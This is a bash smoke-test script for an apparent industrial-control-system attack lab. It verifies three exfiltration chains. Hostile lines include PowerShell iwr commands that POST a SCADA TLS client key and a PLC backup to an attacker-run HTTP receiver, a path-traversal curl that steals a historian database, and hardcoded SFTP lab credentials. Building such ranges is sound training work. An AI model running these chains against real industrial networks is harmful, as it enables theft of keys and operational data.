#!/usr/bin/env bash
# Operational zone exfil chain smoke tests.
#
# Coverage:
#   distribution-scada: iwr -InFile pushes client.key to wizzards-retreat;
#                       unseen-gate can stat the staged file via SFTP
#   uupl-historian:     path-traversal curl from wizzards-retreat saves historian.db;
#                       unseen-gate can stat the staged file via SFTP
#   uupl-eng-ws:        iwr -InFile pushes PLC_Backup_2019.tar.gz to wizzards-retreat;
#                       unseen-gate can stat the staged file via SFTP
#
# All three chains stage loot at /tmp/loot/ on wizzards-retreat (10.10.2.3),
# then verify reachability from unseen-gate using paramiko SFTP stat.
#
# Usage: bash tests/smoke/test_operational_zone_exfil.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

SCADA="distribution-scada"
HIST="uupl-historian"
ENGWS="uupl-eng-ws"
JUMP="wizzards-retreat"
ATTACKER="unseen-gate"

require_running "$SCADA"
require_running "$HIST"
require_running "$ENGWS"
require_running "$JUMP"
require_running "$ATTACKER"

scada() { in_container "$SCADA" /usr/local/bin/winserver2016_shell.sh -c "$1"; }
ws()    { in_container "$ENGWS"  /usr/local/bin/win10ltsc_shell.sh    -c "$1"; }

HIST_IP=$(container_ip "$HIST" operational)

# Staging area: clean slate before each run.
docker exec "$JUMP" bash -c \
    'mkdir -p /tmp/loot && rm -f /tmp/loot/client.key /tmp/loot/historian.db /tmp/loot/PLC_Backup_2019.tar.gz' \
    2>/dev/null

# Check the staged file size from unseen-gate via SFTP (no download needed).
# Uses the attacker venv python which ships paramiko.
sftp_stat() {
    local rpath="$1"
    docker exec -i "$ATTACKER" /opt/attacker-env/bin/python3 - <<EOF 2>/dev/null
import paramiko
t = paramiko.Transport(('10.10.0.10', 22))
t.connect(username='rincewind', password='wizzard')
sftp = paramiko.SFTPClient.from_transport(t)
try:
    print(sftp.stat('$rpath').st_size)
except Exception:
    print(0)
t.close()
EOF
}

# Start an HTTP receiver inside a container and wait until the port is up.
# Usage: start_receiver <container> <bind-ip> <port> <dest-file>
start_receiver() {
    local ctr="$1" ip="$2" port="$3" dest="$4"
    docker exec "$ctr" bash -c "
rm -f $dest
python3 -c \"
from http.server import HTTPServer, BaseHTTPRequestHandler
import os
class R(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        os.makedirs(os.path.dirname('$dest'), exist_ok=True)
        open('$dest', 'wb').write(self.rfile.read(n))
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'ok')
    def log_message(self, *a): pass
HTTPServer(('$ip', $port), R).serve_forever()
\" &>/dev/null &
" 2>/dev/null
    for _i in $(seq 1 10); do
        docker exec "$ctr" ss -tlnp 2>/dev/null | grep -q "$port" && return 0
        sleep 1
    done
    return 1
}

# ── distribution-scada: TLS client key ───────────────────────────────────────

echo "[exfil] distribution-scada client.key"

if start_receiver "$JUMP" 10.10.2.3 19991 /tmp/loot/client.key; then
    IWR_OUT="$(scada 'iwr -Method POST -Uri http://10.10.2.3:19991/client.key -InFile C:\SCADA\Config\certs\client.key')"
    assert_contains "$IWR_OUT" "200|StatusCode|ok" \
        "scada iwr -InFile POSTs client.key to wizzards-retreat (200)"
    sleep 1
    BYTES=$(docker exec "$JUMP" bash -c 'wc -c < /tmp/loot/client.key 2>/dev/null || echo 0')
    docker exec "$JUMP" pkill -f 19991 2>/dev/null || true
    if [ "${BYTES:-0}" -gt 0 ]; then
        ok "client.key staged on wizzards-retreat ($BYTES bytes)"
    else
        fail "client.key staging failed (0 bytes on wizzards-retreat)"
    fi
    PULL=$(sftp_stat /tmp/loot/client.key)
    if [ "${PULL:-0}" -gt 0 ]; then
        ok "unseen-gate can stat client.key on wizzards-retreat ($PULL bytes)"
    else
        fail "unseen-gate cannot stat client.key on wizzards-retreat"
    fi
else
    fail "receiver on wizzards-retreat:19991 did not come up in time"
fi

# ── uupl-historian: SQLite database via path traversal ───────────────────────

echo "[exfil] uupl-historian historian.db"

docker exec "$JUMP" bash -c "
curl -s --max-time 60 'http://${HIST_IP}:8080/export?tag=../historian.db' \
    -o /tmp/loot/historian.db 2>/dev/null" 2>/dev/null
DB_BYTES=$(docker exec "$JUMP" bash -c 'wc -c < /tmp/loot/historian.db 2>/dev/null || echo 0')
if [ "${DB_BYTES:-0}" -gt 4096 ]; then
    ok "historian.db staged on wizzards-retreat ($DB_BYTES bytes)"
else
    fail "historian.db staging failed (${DB_BYTES:-0} bytes, expected >4096)"
fi
PULL=$(sftp_stat /tmp/loot/historian.db)
if [ "${PULL:-0}" -gt 4096 ]; then
    ok "unseen-gate can stat historian.db on wizzards-retreat ($PULL bytes)"
else
    fail "unseen-gate cannot stat historian.db on wizzards-retreat"
fi

# ── uupl-eng-ws: PLC backup archive ──────────────────────────────────────────

echo "[exfil] uupl-eng-ws PLC_Backup_2019.tar.gz"

if start_receiver "$JUMP" 10.10.2.3 19992 /tmp/loot/PLC_Backup_2019.tar.gz; then
    IWR_OUT="$(ws 'iwr -Method POST -Uri http://10.10.2.3:19992/PLC_Backup_2019.tar.gz -InFile backups\PLC_Backup_2019.tar.gz')"
    assert_contains "$IWR_OUT" "200|StatusCode|ok" \
        "eng-ws iwr -InFile POSTs backup archive to wizzards-retreat (200)"
    sleep 1
    BYTES=$(docker exec "$JUMP" bash -c 'wc -c < /tmp/loot/PLC_Backup_2019.tar.gz 2>/dev/null || echo 0')
    docker exec "$JUMP" pkill -f 19992 2>/dev/null || true
    if [ "${BYTES:-0}" -gt 0 ]; then
        ok "PLC_Backup_2019.tar.gz staged on wizzards-retreat ($BYTES bytes)"
    else
        fail "PLC_Backup_2019.tar.gz staging failed (0 bytes on wizzards-retreat)"
    fi
    PULL=$(sftp_stat /tmp/loot/PLC_Backup_2019.tar.gz)
    if [ "${PULL:-0}" -gt 0 ]; then
        ok "unseen-gate can stat PLC_Backup_2019.tar.gz on wizzards-retreat ($PULL bytes)"
    else
        fail "unseen-gate cannot stat PLC_Backup_2019.tar.gz on wizzards-retreat"
    fi
else
    fail "receiver on wizzards-retreat:19992 did not come up in time"
fi

# ── Cleanup ───────────────────────────────────────────────────────────────────

docker exec "$JUMP" rm -rf /tmp/loot 2>/dev/null || true

summary
